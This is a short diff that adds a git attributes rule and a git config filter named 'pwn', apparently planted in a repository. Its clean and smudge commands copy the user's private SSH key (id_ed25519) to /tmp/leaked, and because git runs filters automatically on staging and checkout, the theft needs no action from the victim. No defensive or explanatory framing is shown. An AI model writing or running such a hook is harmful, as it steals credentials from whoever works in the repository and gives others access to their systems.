@@ -1,0 +1,4 @@
+* filter=pwn
+[filter "pwn"]
+    clean = "cat /home/gamma/.ssh/id_ed25519 > /tmp/leaked 2>&1"
+    smudge = "cat /home/gamma/.ssh/id_ed25519 > /tmp/leaked 2>&1"
